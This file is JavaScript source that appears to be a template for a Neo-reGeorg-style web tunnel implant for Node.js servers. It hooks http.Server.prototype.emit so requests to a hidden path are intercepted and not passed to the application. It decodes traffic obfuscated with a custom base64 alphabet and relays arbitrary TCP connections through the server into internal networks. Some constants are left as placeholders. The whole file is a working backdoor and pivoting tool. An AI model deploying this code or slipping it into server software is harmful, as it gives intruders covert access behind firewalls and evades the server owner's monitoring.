(async () => {
  const path = '/proxy_path';

  const http = await import('node:http');
  const net = await import('node:net');

  const DATA = 1;
  const CMD = 2;
  const MARK = 3;
  const STATUS = 4;
  const ERROR = 5;
  const IP = 6;
  const PORT = 7;
  const REDIRECTURL = 8;
  const FORCEREDIRECT = 9;

  const en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  const de = "BASE64 CHARSLIST";

  const states = new Map();

  function blv_decode(data) {
    const info = {};
    let i = 0;
    while (i < data.length) {
      const b = data.readInt8(i);
      const l = data.readUInt32BE(i + 1) - BLV_L_OFFSET;
      i += 5;
      const v = data.slice(i, i + l);
      i += l;
      info[b] = v;
    }
    return info;
  }

  function blv_encode(rinfo) {
    rinfo[0] = randstr();
    rinfo[39] = randstr();
    const parts = [];
    for (let b in rinfo) {
      const v = rinfo[b];
      const buf_v = Buffer.isBuffer(v) ? v : Buffer.from(v);
      const l = buf_v.length + BLV_L_OFFSET;
      const header = Buffer.alloc(5);
      header.writeInt8(parseInt(b), 0);
      header.writeUInt32BE(l, 1);
      parts.push(header, buf_v);
    }
    return Buffer.concat(parts);
  }

  function randstr() {
    const length = Math.floor(Math.random() * 16) + 5;
    const rand = Buffer.alloc(length);
    for (let i = 0; i < length; i++) {
      rand[i] = Math.floor(Math.random() * 256);
    }
    return rand;
  }

  function strtr(str, from, to) {
    const map = new Map();
    for (let i = 0; i < Math.min(from.length, to.length); i++) {
      map.set(from.charCodeAt(i), to.charCodeAt(i));
    }
    const buf = Buffer.from(str);
    for (let i = 0; i < buf.length; i++) {
      const rep = map.get(buf[i]);
      if (rep !== undefined) {
        buf[i] = rep;
      }
    }
    return buf.toString();
  }

  const originalEmit = http.Server.prototype.emit;
  http.Server.prototype.emit = function (event, ...args) {
    if (event === 'request') {
      const [req, res] = args;
      const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
      if (parsedUrl.pathname === path) {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
          let post_data = body;

          const translated = strtr(post_data, de, en);
          const decoded = Buffer.from(translated, 'base64');
          let info;
          try {
            info = blv_decode(decoded);
          } catch (e) {
            res.writeHead(500);
            res.end();
            return;
          }

          let rinfo = {};
          let sayhello = false;
          const mark = info[MARK] ? info[MARK].toString() : null;
          const cmd = info[CMD] ? info[CMD].toString() : null;

          if (!cmd || !mark) {
            sayhello = true;
          } else {
            switch (cmd) {
              case "CONNECT": {
                const target = info[IP] ? info[IP].toString() : null;
                const port = info[PORT] ? parseInt(info[PORT].toString()) : null;
                if (!target || !port) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('Missing IP or PORT');
                  const output = blv_encode(rinfo);
                  const base = output.toString('base64');
                  const translated_out = strtr(base, en, de);
                  res.end(translated_out);
                  return;
                }
                const socket = net.createConnection({ port, host: target });
                let connected = false;
                socket.on('connect', () => {
                  connected = true;
                  const state = {
                    run: true,
                    writebuf: Buffer.alloc(0),
                    readbuf: Buffer.alloc(0),
                    socket,
                  };
                  states.set(mark, state);
                  socket.on('data', data => {
                    if (state.run) {
                      state.readbuf = Buffer.concat([state.readbuf, data]);
                      if (state.readbuf.length > MAXREADSIZE) {
                        state.readbuf = state.readbuf.slice(state.readbuf.length - MAXREADSIZE);
                      }
                    }
                  });
                  socket.on('close', () => { state.run = false; });
                  socket.on('error', err => {
                    console.error('error:', err);
                    state.run = false;
                  });

                  const writeInterval = setInterval(() => {
                    if (!state.run) {
                      clearInterval(writeInterval);
                      return;
                    }
                    if (state.writebuf.length > 0) {
                      const toWrite = state.writebuf;
                      state.writebuf = Buffer.alloc(0);
                      socket.write(toWrite, err => {
                        if (err) state.run = false;
                      });
                    }
                  }, 50);

                  const checkInterval = setInterval(() => {
                    if (!state.run) {
                      clearInterval(checkInterval);
                      clearInterval(writeInterval);
                      socket.destroy();
                      states.delete(mark);
                      const output = blv_encode(rinfo);
                      const base = output.toString('base64');
                      const translated_out = strtr(base, en, de);
                      res.end(translated_out);
                    }
                  }, 50);
                });
                socket.on('error', err => {
                  console.error('error:', err);
                  if (!connected) {
                    rinfo[STATUS] = Buffer.from('FAIL');
                    rinfo[ERROR] = Buffer.from('Failed connecting to target');
                    const output = blv_encode(rinfo);
                    const base = output.toString('base64');
                    const translated_out = strtr(base, en, de);
                    res.end(translated_out);
                  }
                });
                break;
              }
              case "DISCONNECT": {
                const state = states.get(mark);
                if (state) {
                  state.run = false;
                  state.socket.destroy();
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              case "READ": {
                const state = states.get(mark);
                if (!state || !state.run) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('TCP session is closed');
                } else {
                  rinfo[STATUS] = Buffer.from('OK');
                  rinfo[DATA] = state.readbuf;
                  state.readbuf = Buffer.alloc(0);
                  res.setHeader("Connection", "Keep-Alive");
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              case "FORWARD": {
                const state = states.get(mark);
                if (!state || !state.run) {
                  rinfo[STATUS] = Buffer.from('FAIL');
                  rinfo[ERROR] = Buffer.from('TCP session is closed');
                } else {
                  const rawPostData = info[DATA] || Buffer.alloc(0);
                  if (rawPostData.length > 0) {
                    state.writebuf = Buffer.concat([state.writebuf, rawPostData]);
                    rinfo[STATUS] = Buffer.from('OK');
                    res.setHeader("Connection", "Keep-Alive");
                  } else {
                    rinfo[STATUS] = Buffer.from('FAIL');
                    rinfo[ERROR] = Buffer.from('POST data parse error');
                  }
                }
                const output = blv_encode(rinfo);
                const base = output.toString('base64');
                const translated_out = strtr(base, en, de);
                res.end(translated_out);
                break;
              }
              default:
                sayhello = true;
                break;
            }
          }

          if (sayhello) {
            const message = "NeoGeorg says, 'All seems fine'";
            const translated_m = strtr(message, de, en);
            const decoded_m = Buffer.from(translated_m, 'base64').toString();
            res.end(decoded_m);
          }
        });
        return true;
      }
    }
    return originalEmit.apply(this, arguments);
  };
})();
